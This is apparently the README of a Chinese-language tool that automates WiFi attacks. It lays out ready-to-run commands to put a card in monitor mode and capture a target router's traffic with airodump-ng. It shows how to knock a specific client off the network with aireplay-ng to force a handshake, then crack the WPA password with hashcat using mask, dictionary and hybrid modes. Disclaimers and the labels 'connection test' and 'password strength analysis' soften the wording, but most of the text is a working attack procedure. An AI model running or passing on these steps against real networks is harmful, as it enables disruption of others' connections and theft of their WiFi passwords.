# WiFi 网络安全学习工具

## 项目简介
本工具旨在帮助用户学习和研究 WiFi 网络安全，通过自动化脚本和 `tmux` 会话管理，用户可以快速捕获 WiFi 数据包并对目标设备进行网络连接测试（Deauthentication Test）。

⚠️ **免责声明：本工具仅供学习和研究网络安全使用，请勿将其用于非法用途。使用本工具造成的任何后果由使用者自行承担，开发者不承担任何责任。**

---

## 原理说明

1. **数据包捕获**
   - 使用 `airodump-ng` 工具对目标 WiFi 网络进行监听，捕获数据包。
   - 数据包保存为 `.cap` 文件。

2. **网络连接测试（Deauthentication Test）**
   - 使用 `aireplay-ng` 工具向目标设备发送断开连接数据包（Deauth packets）。
   - 通过模拟网络环境干扰，测试目标设备的连接稳定性。

3. **数据包转换**
   - 使用 `hcxpcapngtool` 将捕获的 `.cap` 文件转换为 `hc22000` 格式，便于后续密码强度分析。

4. **会话管理**
   - 使用 `tmux` 管理两个并行的任务：
     - 左窗格：运行数据包捕获任务。
     - 右窗格：用户交互界面，用于选择目标设备并执行网络测试。
5.**原始命令**
   -sudo airmon-ng

   ** put your network device into monitor mode.wlon0是网卡设备名.
   -sudo airmon-ng start wlan0

   ** listen for all nearby beacon frames to get target BSSID and channel
   -sudo airodump-ng wlan0mon

   ** start listening for the handshake.-c6指的是信道.--bssid指的是AP.test是文件夹.wlan0mon是网卡设备名
   -sudo airodump-ng -c 6 --bssid 9C:5C:8E:C9:AB:C0 -w test/ wlan0mon

   ** optionally deauth a connected client to force a handshake.-a指的是AP.-c指的是Client（STATION）.
   -sudo aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 wlan0mon
   
   -python -m http.server 1234

---

## 使用方法

### 1. 环境依赖
请确保以下工具已安装：
- Python 3
- `airmon-ng`（Kali Linux 自带）
- `airodump-ng`（Kali Linux 自带）
- `aireplay-ng`（Kali Linux 自带）
- `hcxpcapngtool`
- `tmux`

### 2. 配置文件
在项目根目录下创建 `config.json` 文件，内容如下：
```json
{
  "IFACE": "wlan0",       // 无线网卡接口名称
  "MON": "wlan0mon",     // 无线网卡监听模式名称
  "BSSID": "XX:XX:XX:XX:XX:XX", // 目标路由器的 MAC 地址
  "CHANNEL": "6",        // 目标路由器的信道
  "SESSION": "wifi_attack" // tmux 会话名称
}
```

### 3. 运行脚本
1. 启动脚本：
   ```bash
   python app.py
   ```
2. 输入实验名称（文件名），脚本会自动创建对应的工作目录。
3. 根据提示选择操作：
   - `[d]`：选择目标设备并发送断开连接数据包。
   - `[q]`：结束任务并转换数据包格式。

---

## 注意事项
1. **法律风险**
   - 请勿在未授权的网络上使用本工具。
   - 使用本工具可能违反当地法律法规，请确保在合法范围内操作。

2. **技术限制**
   - 本工具依赖于无线网卡的监听模式，请确保网卡支持。
   - 测试效果可能因目标设备和路由器的防御机制而异。

3. **安全性**
   - 请在隔离的测试环境中使用本工具，避免对他人网络造成干扰。

---

## 目录结构
```
WiFi攻击自动化
├── app.py          # 主程序
├── config.json     # 配置文件（需用户创建）
├── runs/           # 实验数据存储目录
└── README.md       # 使用说明
```

---


⚠️ **再次声明：请勿将本工具用于非法用途，开发者不承担任何责任。**

---

## 密码强度分析原理与用法

本工具支持使用 `hashcat` 对捕获的 WiFi 数据包进行密码强度分析，以下是常用命令的说明：

### 1. 转换数据包格式
在进行密码强度分析之前，需要将 `.cap` 文件转换为 `hashcat` 可识别的 `hc22000` 格式：
```bash
hcxpcapngtool -o wifi.hc22000 ./-01.cap
```

### 2. 分析模式

#### 掩码分析
使用掩码模式尝试所有可能的密码组合：
```bash
hashcat -m 22000 -a 3 wifi.hc22000 ?d?d?d?d?d?d?d?d?d?d?d
```
- `-m 22000`：指定 WiFi 密码的哈希类型。
- `-a 3`：指定掩码分析模式。
- `?d`：表示一位数字，`?d?d?d...` 表示尝试所有 11 位数字组合。

#### 混合分析
1. **密码本 + 后 4 位掩码**
   ```bash
   hashcat -m 22000 -a 6 wifi.hc22000 number.txt ?d?d?d?d
   ```
   - `-a 6`：指定密码本 + 掩码模式。
   - `number.txt`：密码本文件。

2. **前 4 位掩码 + 密码本**
   ```bash
   hashcat -m 22000 -a 7 wifi.hc22000 ?d?d?d?d number.txt
   ```
   - `-a 7`：指定掩码 + 密码本模式。

#### 普通密码本分析
使用密码本尝试分析：
```bash
hashcat -m 22000 -a 0 wifi.hc22000 number.txt
```
- `-a 0`：指定密码本分析模式。

#### 断点分析 + 掩码分析
支持断点恢复功能，适用于长时间运行的分析任务：
1. 开始分析并保存断点：
   ```bash
   hashcat -m 22000 -a 3 -1 ?d?l --session wifi_analysis_TPlink wifi2.hc22000 ?1?1?1?1?1?1?1?1
   ```
   - `--session`：指定会话名称，便于恢复。
   - `?1`：表示自定义字符集（如数字和小写字母）。

2. 恢复分析：
   ```bash
   hashcat --session wifi_analysis_TPlink --restore
   ```
   - `--restore`：从上次中断的地方继续分析。
